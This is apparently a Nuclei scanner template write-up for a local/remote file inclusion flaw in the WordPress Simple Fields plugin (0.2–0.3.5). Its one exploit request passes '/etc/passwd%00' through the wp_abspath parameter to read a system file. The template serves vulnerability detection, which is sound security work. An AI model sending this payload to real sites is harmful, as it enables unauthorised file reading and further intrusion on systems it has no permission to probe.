# Nuclei Template: WordPress Simple Fields 0.2 - 0.3.5 LFI/RFI/RCE
**Template ID:** wp-simple-fields-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`wp-simple-fields-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Simple Fields 0.2 is vulnerable to local file inclusion, remote file inclusion, and remote code execution.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00
```

## References
- https://packetstormsecurity.com/files/147102/WordPress-Simple-Fields-0.3.5-File-Inclusion-Remote-Code-Execution.html
